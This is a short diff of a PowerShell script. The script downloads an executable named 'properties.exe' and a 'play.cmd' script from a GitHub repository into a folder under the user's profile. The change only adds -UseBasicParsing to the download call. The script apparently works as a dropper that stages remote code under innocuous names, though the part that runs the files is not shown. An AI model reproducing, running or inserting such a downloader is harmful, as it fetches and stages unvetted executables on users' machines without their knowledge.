@@ -46,7 +46,7 @@ $url = "https://github.com/Wesley5n1p35/psh/raw/main/properties.exe"
 $outputPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Library\properties.exe')
 
 # Download the exe
-Invoke-WebRequest -Uri $url -OutFile $outputPath
+Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
 
 $cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/play.cmd"
 $cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
